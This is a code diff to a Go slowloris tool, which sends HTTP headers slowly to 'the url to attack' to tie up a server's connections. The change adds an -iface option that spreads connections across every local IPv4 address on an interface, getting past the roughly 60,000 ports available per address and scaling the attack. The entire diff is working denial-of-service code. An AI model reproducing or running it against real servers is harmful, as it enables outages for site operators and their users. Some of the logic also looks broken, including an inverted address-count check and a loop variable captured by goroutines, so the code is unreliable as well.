@@ -16,7 +16,7 @@ import (
 
 //Config contains the configuration for this program.
 var Config struct {
-	URLString, Method                                            string
+	URLString, Method, InterfacePrefix                           string
 	Addr                                                         *net.TCPAddr
 	Interval, NumWorkers, Connrate                               int
 	IsHTTPS                                                      bool
@@ -34,6 +34,7 @@ var Stats struct {
 func init() {
     //We need rand to generate random HTTP header key-value pairs
 	rand.Seed(time.Now().UnixNano())
+	flag.StringVar(&Config.InterfacePrefix, "iface", "", "Use all local addresses from this interface.")
 	flag.StringVar(&Config.URLString, "url", "http://localhost/", "The url to attack")
 	flag.StringVar(&Config.Method, "method", "GET", "The method of the HTTP request")
 	flag.IntVar(&Config.Connrate, "connrate", 50, "Rate of connection establishing")
@@ -80,19 +81,71 @@ func main() {
 		return
 	}
 
-    //Start the workers
-	for i := 1; i <= Config.NumWorkers; i++ {
-		go func() {
-			for {
-				RunConnection()
+    if Config.InterfacePrefix == "" {
+		//Start the workers
+		for i := 1; i <= Config.NumWorkers; i++ {
+				go func() {
+					for {
+						RunConnection(nil)
+					}
+				}()
+				if (i % Config.Connrate) == 0 {
+					time.Sleep(time.Second)
+					fmt.Println("Connecting: ", Stats.Connecting, "| Sending: ", Stats.Sending)
+				}
 			}
-		}()
-        if (i % Config.Connrate) == 0 {
-            time.Sleep(time.Second)
-		    fmt.Println("Connecting: ", Stats.Connecting, "| Sending: ", Stats.Sending)
+    } else {
+        ifaces, err := net.Interfaces()
+        if err != nil {
+            fmt.Println(err)
+            return
         }
+        localAddresses := make([]string, 0, len(ifaces))
+        for _, iface := range ifaces {
+            if !strings.HasPrefix(iface.Name, Config.InterfacePrefix) {
+                continue
+            }
+            addrs, err := iface.Addrs()
+            if err != nil {
+                continue
+            }
+            for _, addr := range addrs {
+                ipnet, ok := addr.(*net.IPNet)
+                if !ok {
+                    continue
+                }
+                ipv4 := ipnet.IP.To4()
+                if ipv4 == nil {
+                    continue
+                }
+                localAddresses = append(localAddresses, ipv4.String())
+            }
+        }
+        if len(localAddresses) == 0 {
+            fmt.Println("No IP addresses found!")
+            return
+        } else if len(localAddresses) * 60000 > Config.NumWorkers {
+            fmt.Println("Not enough IP addresses found!")
+            return
+		}
+        fmt.Printf("Using following IPs: %+v\n", localAddresses)
+
+		//Start the workers
+		for i := 1; i <= Config.NumWorkers; i++ {
+				go func() {
+					for {
+						RunConnection(&net.TCPAddr{
+							IP: net.ParseIP(localAddresses[i / 60000]),
+							Port: 2049 + (i % 60000),
+						})
+					}
+				}()
+				if (i % Config.Connrate) == 0 {
+					time.Sleep(time.Second)
+					fmt.Println("Connecting: ", Stats.Connecting, "| Sending: ", Stats.Sending)
+				}
+			}
 	}
-    
     //Start the statistics printer
 	ticker := time.NewTicker(1 * time.Second)
 	for _ = range ticker.C {
@@ -103,7 +156,7 @@ func main() {
 //TryConnect tries to connect to the host specified in config.addr. It repeatedly tries to connect with a timeout of 100 milliseconds
 //if the host is unreachable. If config.isHTTP is set, then an additional TLS connection is started and the handshake is executed, making
 //the connection usable immediately after returning.
-func TryConnect() net.Conn {
+func TryConnect(localAddr *net.TCPAddr) net.Conn {
 	const millisecondsBeforeRetry = 100
 	var conn net.Conn
 	for {
@@ -131,10 +184,10 @@ func TryConnect() net.Conn {
 //RunConnection runs a single connection by first connecting to the host, and then sending HTTP headers in slow-loris style.
 //The interval between sending headers is specified by config.interval. If necessary an underlying TLS connection is established to
 //support HTTPS.
-func RunConnection() {
+func RunConnection(localAddr *net.TCPAddr) {
     //Try to connect first. This blocks until a connection is made.
 	atomic.AddInt32(&Stats.Connecting, 1)
-	conn := TryConnect()
+	conn := TryConnect(localAddr)
 	atomic.AddInt32(&Stats.Connecting, -1)
     
 	atomic.AddInt32(&Stats.Sending, 1)
